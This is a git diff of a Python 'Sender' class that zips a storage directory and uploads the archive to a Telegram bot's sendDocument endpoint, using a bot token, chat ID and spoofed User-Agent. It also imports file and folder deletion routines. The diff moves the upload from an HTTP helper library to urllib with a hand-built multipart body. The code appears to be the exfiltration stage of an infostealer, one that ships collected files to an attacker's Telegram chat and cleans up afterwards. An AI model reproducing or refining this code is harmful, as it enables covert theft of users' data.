@@ -1,7 +1,9 @@
 from os import remove
 from shutil import make_archive, rmtree
+from urllib.request import Request, urlopen
 
-from ..utils.config import http, SenderConfig
+from ..utils.config import SenderConfig
+from ..utils.multipart import MultipartFormDataEncoder
 
 
 class Sender:
@@ -21,15 +23,21 @@ class Sender:
 
         with open(rf"{self.storage_path}\{self.zip_name}.zip", "rb") as file:
 
-            http.request(
+            content_type, body = MultipartFormDataEncoder().encode(
+                [("chat_id", self.user_id)],
+                [("document", f"{self.zip_name}.zip", file)]
+            )
+
+            query = Request(
                 method="POST",
                 url=f"https://api.telegram.org/bot{self.token}/sendDocument",
-                fields=
-                {
-                    "chat_id": self.user_id,
-                    "document": (f"{self.zip_name}.zip", file.read(), "document/zip"),
-                }
+                data=body
             )
+
+            query.add_header("User-Agent", self.config.UserAgent)
+            query.add_header("Content-Type", content_type)
+
+            urlopen(query)
 
         file.close()
 
